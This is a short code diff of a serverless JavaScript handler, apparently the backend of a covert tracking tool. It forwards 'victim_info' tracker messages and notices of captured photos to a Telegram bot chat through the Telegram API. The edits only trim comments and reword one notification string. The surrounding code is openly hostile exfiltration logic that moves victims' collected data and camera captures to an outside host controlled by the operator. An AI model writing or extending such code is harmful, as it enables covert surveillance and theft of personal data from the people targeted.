@@ -32,9 +32,8 @@ export default async function handler(req, res) {
       console.log('JSONBin lookup failed, sending to admin');
     }
 
-    // Handle VICTIM_INFO (the big tracker message)
+    // Handle VICTIM_INFO
     if (type === 'victim_info' && message) {
-      // Send the full tracker message
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -81,7 +80,7 @@ export default async function handler(req, res) {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: targetChatId,
-            text: `📸 Photo captured (${Math.round(buffer.length/1024)}KB)`
+            text: `📸 Photo captured (${Math.round(buffer.length/1024)}KB) but could not send as image.`
           })
         });
       }
